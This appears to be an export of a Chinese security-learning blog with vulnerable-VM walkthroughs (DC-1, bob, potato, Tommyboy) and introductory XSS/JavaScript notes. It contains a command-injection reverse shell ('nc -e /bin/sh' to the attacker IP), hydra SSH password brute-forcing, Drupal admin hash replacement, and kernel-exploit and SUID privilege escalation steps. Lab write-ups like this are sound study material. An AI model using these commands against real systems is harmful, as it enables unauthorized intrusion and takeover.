mysql -h localhost(登陆别的地址需要ip 本地可选 是默认的) -u [用户名] -p[密码](注意这里不用空格) //登录mysql系统
mysql命令(请注意每个命令都需要分号结尾)
show databases; //显示数据库列表
use [数据表名]; //选择数据库列表
show tables; //显示库中的数据表
select [范围,*为全部] from [表名]; //查询表内数据
update 表名 set 字段="[要修改成的值]" where 子句 order by 子句 limit 子句; //更新表内数据
WHERE 子句：可选项。用于限定表中要修改的行。若不指定，则修改表中所有的行。
ORDER BY 子句：可选项。用于限定表中的行被修改的次序。
LIMIT 子句：可选项。用于限定被修改的行数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/7.jpg" alt="7"><br>我们这里成功登陆上了mysql 由于information_schema是mysql数据库自带 我们选中并查看<strong>drupaldb</strong>表中的数据<br>该表中有一个名为<strong>users</strong>的库 很明显 我们需要查看库中的数据<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/8.jpg" alt="8"><br>很尴尬 由于窗口分辨率原因 数据错位了不是很好阅读<br>可以使用<strong>\G</strong>来代替查询语句的分号 来使结果垂直显示<br>tips:<strong>\g</strong>与分号作用相同 请注意大写<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/9.jpg" alt="9"><br>这里有俩账号 一个叫<strong>admin</strong> 一个叫<strong>Fred</strong><br>那我们要登陆账号 优先一定选择权限更高的<strong>admin</strong>账号<br>更改密码 但我们可以看到pass处是被hash加密过的密码<br>想要反推的可能性不大而且费时 于是考虑替换密码<br>这里就要利用<strong>Drupal</strong>作为模板网站的特性<br>通过检索发现该网站的**/scripts<strong>目录下拥有可以生成同款hash加密密码字符的password-hash.sh文件<br>直接执行<code>./[sh文件目录] [想要加密的密码]</code>来生成<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/10.jpg" alt="10"><br>生成一段hash码 再次进入mysql 替换数据 随后使用admin与</strong>更改过的密码<strong>来登陆网站<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/11.jpg" alt="11"><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/12.jpg" alt="12"><br>登陆完毕 我们查看任务栏中的</strong>Content<strong>查看过去的文章内容 发现</strong>flag3.txt**<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/13.jpg" alt="13"><br>点击<strong>edit</strong>查看内容<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/14.jpg" alt="14"><br>其中强调了 <strong>FIND与-EXEC</strong><br>我们于是需要介绍<strong>find suid提权</strong><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/15.jpg" alt="15"><br>第一步的具体作用是<strong>找出拥有suid权限的指令</strong><br>在发现find拥有suid权限后 便可以通过find提权</p>
<blockquote>
<p>参考：<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/18.jpg" alt="18"><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/17.jpg" alt="17"></p>
</blockquote>
<p>拥有了root权限 我们便可以进一步寻找flag文件</p>
<pre class="line-numbers language-none"><code class="language-none">find / -name "*flag*.txt" //根据名称寻找根目录下文件名中含有完整flag单词的txt文件(星号代表任意字符)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/16.jpg" alt="16"><br>结束 感谢！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又一个过程不长但复杂的靶机<br>让我认识到了即使find这个看起来只有寻物功能的指令有了附加项后也能用于提权<br>真是奇妙<br>那么我们下次见</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之bob</title>
    <url>/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>总之这是这周的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：bob （192.168.246.138）</p>
<h2 id="使用工具-指令-知识"><a href="#使用工具-指令-知识" class="headerlink" title="使用工具&amp;指令&amp;知识"></a>使用工具&amp;指令&amp;知识</h2><p>nc（瑞士军刀）<br>nmap （端口扫描）<br>gpg加密<br>命令执行漏洞</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>首先国际惯例</p>
<pre class="line-numbers language-none"><code class="language-none">arp-scan -l //发现同网段设备
nmap -A -p- [ip地址] //扫描该ip的端口并使用默认脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/3.jpg" alt="3"><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/4.jpg" alt="4"><br>发现了该靶机开放了21端口(对应ftp服务) 80端口(对应http服务) 25468端口(对应ssh服务)<br>我们先从http服务开启 firefox访问<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/5.jpg" alt="5"><br>主页与超链接经检查 没有发现什么特别的东西<br>于是我们来看看nmap在/robots.txt下扫描出的四个目录</p>
<blockquote>
<h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p>
<ul>
<li>不要访问某个文件、文件夹</li>
<li>禁止某些爬虫的访问</li>
<li>限制爬虫访问网站的频率</li>
</ul>
<p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p>
</blockquote>
<p>发现dev-shell目录中存在命令执行漏洞 既使用 <strong>管道符|</strong> 来执行nc相关命令<br>在kali上执行<code>nc -lnvp 1234 //指定1234端口开始监听</code><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/7.jpg" alt="7"><br>运用命令行输入<code>w|nc -e /bin/sh [kali的ip] [指定端口]</code></p>
<blockquote>
<p><img data-src="/1.png" alt="1"><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/2.png" alt="2"></p>
</blockquote>
<p>随后反弹shell成功<br>首先 反弹到的shell页面不是很易懂 我们可以使用<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>来创建一个伪终端 方便后面的操作</p>
<blockquote>
<p><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/8.jpg" alt="8"></p>
</blockquote>
<p>根据该作者在vulnhub上的提示 flag文件位于**/<strong>目录<br>但权限不够 我们需要提权<br>先根据我们对该靶机的推测 在/home/bob中寻找线索<br>发现了一个</strong>.old_passwordfile.html**<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/9.jpg" alt="9"><br>查看后是<strong>两对密码和账号</strong><br>我们通过ssh链接来分别测试这些账号密码<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/10.jpg" alt="10"><br>很好 jc账号的密码正确 链接了靶机<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/11.jpg" alt="11"><br>再次在/home/bob下寻找线索 发现/Documents下有一个名为<strong>secret</strong>的文件夹和一个经过gpg加密的文件<strong>login.txt</strong> 需要密码<br>我们使用<code>ls -alR // -R 递归显示所有子文件夹和其中的文件</code>查看<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/13.jpg" alt="13"><br>有一个<strong>notes.sh</strong>文件 我们查看其中的内容<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/14.jpg" alt="14"><br>前言不搭后语的 但第一个字母都着重大写了 并且是一个单词 我们把它当作藏头诗理解 尝试解密先前的gpg文件<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/16.jpg" alt="16"><br><code>gpg --output [输出文件名] --decrypt [需要解密的文件名]</code><br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/15.jpg" alt="15"><br>输入密码<strong>HARPOCRATES</strong>(你可别说这页面还挺炫)<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/16.jpg" alt="16"><br>解密出来又是一套账号密码<br>再次登录 发现这次的账号有<strong>sudo</strong>权限<br>那很方便了 利用sudo查看该flag文件<br><img data-src="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/17.jpg" alt="17"><br>结束！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>较为简短的靶机 结合了gpg加密与命令执行漏洞的知识<br>学无止境 期待下次的靶机</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>potato解析</title>
    <url>/2023/12/10/potato%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：potato（192.168.246.137）</p>
<h2 id="使用工具-指令"><a href="#使用工具-指令" class="headerlink" title="使用工具&amp;指令:"></a>使用工具&amp;指令:</h2><p>nmap （端口扫描）<br>hydra （服务端密码爆破）<br>sreachsploit （漏洞检索）<br>ssh （远程登录服务）<br>find （寻找文件）<br>scp （linux之间远程传输文件）</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>国际惯例</p>
<pre class="line-numbers language-none"><code class="language-none">arp-scan -l //发现同网段设备
nmap -A -p- “ip地址” //扫描指定ip开放的端口 并套用默认脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>扫描发现该ip开放了80端口与7120端口 其中7120端口对应ssh服务<br>我们使用firefox访问该ip<br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>没有发现什么特殊的东西 f12也没有隐藏注释<br>只能将我们的注意转到ssh服务中<br>但ssh需要<strong>账号与密码</strong> 而我们目前没有<br>按照该靶机名称与网页中的土豆图片 我们推测账户名为<strong>potato</strong> 进行一次密码爆破来测试</p>
<pre class="line-numbers language-none"><code class="language-none">hydra -l “账号名” -P “密码字典文件” -V -t 4 服务://ip地址：端口
// 密码字典位于/usr/share/wordlists/rockyou.txt.gz 中 请自行解压
gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
// -V 显示具体过程
// -t 1-64 决定线程 数字越大爆破速度越快 但占用更大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>结果出来了 账号 <strong>potato</strong> 的密码为 <strong>letmein</strong><br>我们赶紧来登录一下吧</p>
<pre class="line-numbers language-none"><code class="language-none">ssh 用户名@ip地址 -p 端口 //由于该端口不是默认的22 所以需要额外注释 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/5.jpg" alt="5"><br>进入后发现/root文件夹中有我们想要的文件 但当前权限不够<br>于是需要<strong>提权</strong><br>我们使用<strong>sreachsploit</strong>  来搜索<strong>该版本ubuntu的提权漏洞</strong></p>
<pre class="line-numbers language-none"><code class="language-none">sreachsploit “搜索关键词”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br>有了 文件名是<strong>37292.c</strong><br>不知道该文件在哪里 我们<strong>使用find命令</strong>寻找该文件</p>
<pre class="line-numbers language-none"><code class="language-none">find [路径] [匹配条件]
参数说明:
路径 是要查找的目录路径，可以是一个目录或文件名，也可以是多个路径，多个路径之间用空格分隔，如果未指定路径，则默认为当前目录。
expression 是可选参数，用于指定查找的条件，可以是文件名、文件类型、文件大小等等。
匹配条件 中可使用的选项有二三十个之多，以下列出最常用的部份：
-name pattern：按文件名查找，支持使用通配符 * 和 ?。
-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。
-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。
-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。
-user username：按文件所有者查找。
-group groupname：按文件所属组查找。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随后<strong>使用scp命令</strong>将文件传输到靶机中</p>
<pre class="line-numbers language-none"><code class="language-none">scp [可选参数] [文件源] [传输目标] 
// -p 指定端口
// 传输目标格式为 用户名@ip:/目标文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>随后执行提权漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">gcc 37292.c -o exp  //对刚刚下载的提权脚本进行编译
chmod +x exp //给提权脚本赋予执行权限 
./exp //运行提权脚本，运行后即可提权至root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br><strong>阅读/root下的/proof.txt</strong><br>明显是一串<strong>md5加密</strong>后的产物 我们拿去解密网站解密 获得flag<br><img data-src="/2023/12/10/potato%E8%A7%A3%E6%9E%90/9.jpg" alt="9"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比较小体量的靶机 主要集中在一些标准的<strong>密码爆破</strong> <strong>漏洞提权</strong> 过程中<br>那么我们下次见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>xss跨站点脚本攻击</title>
    <url>/2023/12/05/xss%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 总之这是今天的笔记</p>
<h2 id="什么是xss跨站点脚本攻击"><a href="#什么是xss跨站点脚本攻击" class="headerlink" title="什么是xss跨站点脚本攻击"></a>什么是xss跨站点脚本攻击</h2><p>XSS的原理和分类<br>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
<span id="more"></span>

<p>1.什么是Javascript<br>JavaScript是指在网页上编写的脚本语言，是对HTML在功能上的扩展。<br>JavaScript与Java没有任何关系，它们只是名字相似而已。<br>JavaScript的代码嵌入在HTML里，直接在客户端的浏览器上执行，属于前端语言。<br>大多数的XSS代码都是使用JavaScript语言编写的，JavaScript能做到什么效果，XSS的威力就有多大。<br>JavaScript自测<br><a href="https://www.w3school.com.cn/quiz/quiz.asp?quiz=js">https://www.w3school.com.cn/quiz/quiz.asp?quiz=js</a><br>JavaScript基础语法练习<br>搭建环境（WS2008+AppServ+Sublime）<br>例子1：JavaScript test</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	document.write("&lt;h1&gt;Hello,world")
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子2：JavaScript 变量</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript 变量&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	var name = "shuke";
	document.write("&lt;h1&gt;hello,"+ name)
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子3：JavaScript 字符串拼接</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;字符串拼接&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	var name = "leiyu";
	var age = 17;
	document.write("&lt;h1&gt;Hello,everyone! My name is " + name +". I'm " + age +" years old.");
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子4：JavaScript 事件响应</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript 事件响应&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;form action=""&gt;
		&lt;input type="button" value="请单击此处" onclick=alert('你单击了此按钮，触发了弹窗') &gt;
	&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子5：JavaScript OnError事件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript OnError事件&lt;/title&gt;
&lt;/head&gt;
&lt;body onload=alert("客官，您久等了....")&gt;
	&lt;img src="./images/welcome.png" onerror=alert("请检查图片路径....")&gt;
&lt;/body&gt;
&lt;/html&gt;
加载外部js文件
jstest.html文件
&lt;script src="/js/test.js"&gt;&lt;/script&gt;
test.js文件
alert("hello,world!");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子6:加载外部文件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script src=“URL"&gt;&lt;/script&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;加载外部js文件&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script src="./js/test.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子7:加载外部文件document对象的常用属性:cookie,location</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;document对象的常用属性:cookie,location&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	alert(document.cookie);
	alert(document.location);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子8:location.href实现页面跳转</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;location.href实现页面跳转&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
		alert(document.location);
		location="http://www.51cto.com";
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子9:Javascript语法-条件判断+函数</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;

&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;Javascript语法-条件判断+函数&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
	function getGrade(score){
	if (score&gt;=60){
	return "及格";
	}
	else{
	return "不及格";
	}
	}
document.write(getGrade(40));
&lt;/script&gt;	
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子10：条件分支</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;根据分数给出等第&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
function getGrade(score)
{
	if(score&gt;=90)
	{
	return "excellent";
}
else if(score&gt;=80)
{
	return "good";
}
else if(score&gt;=70){
	return "just so so";
}
else if(score&gt;=60){
	return "pass";
}
else if{
	return "not good";
}
}
document.write(getGrade(70));
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之Tommyboy1dot0</title>
    <url>/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p> 总之这是今天的靶机</p>
<h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>攻击机：kali（192.168.246.128）<br>• <strong>工具：</strong><br>nmap（端口扫描）<br>dirbuster（目录爆破）<br>crunch（密码表生成）<br>fcrackzip （压缩包爆破）<br>wpscan （扫描/爆破wordpress）</p>
<p>• <strong>知识点：</strong><br>   1、信息泄露<br>   2、md5解密<br>   3、命令执行</p>
<span id="more"></span>

<h1 id="获取过程"><a href="#获取过程" class="headerlink" title="获取过程"></a>获取过程</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/1.jpg" alt="1"><br>国际惯例 先arp-scan 发现同网段的设备<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/2.jpg" alt="2"><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/6.jpg" alt="6"></p>
<blockquote>
<p><strong>-sC ：根据端口识别的服务，调用默认脚本 。</strong></p>
</blockquote>
<p>我们借用nmap的-sC附加项 发现80端口存在四个<strong>防止爬虫进入的目录</strong></p>
<blockquote>
<h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p>
<ul>
<li>不要访问某个文件、文件夹</li>
<li>禁止某些爬虫的访问</li>
<li>限制爬虫访问网站的频率</li>
</ul>
<p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p>
</blockquote>
<p>依次进入 发现flag-numero-uno.txt目录下存在第一个flag信息<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/7.jpg" alt="7"><br>按他的描述 <strong>存在五个flag碎片</strong> 我们需要集齐它们来获取最终的宝藏</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>firefox访问80端口<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/3.jpg" alt="3"><br>f12发现隐藏注释<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/4.jpg" alt="4"><br>翻译大意为<strong>线索在这段youtube视频之中</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/5.jpg" alt="5"><br>访问查看 全文就一句 <strong>“hey prehistoricforest”</strong><br>我们尝试 **/prehistoricforest/**目录<br>访问发现是个公司博客<br>我们查看其中的文章与评论获取线索<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/8.jpg" alt="8"><br>发现了flag2的线索：thisisthesecondflagyayyou.txt<br>往目录中输入查看<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/9.jpg" alt="9"><br>成功获取第二个flag</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/10.jpg" alt="10"><br>博客的前两篇相互关联<br>一篇是加密的 无法访问<br>而另一篇则是在询问该加密博客的密码<br>我们查看该博客来寻找线索<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/11.jpg" alt="11"><br>提示提到我们要删去目录中的 <strong>prehistoricforest</strong> 换上 <strong>richard</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/12.jpg" alt="12"><br>发现了一张图片 我们保存下来<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/13.jpg" alt="13"><br>使用<strong>strings</strong>工具查看是否存在图片隐写<br><img 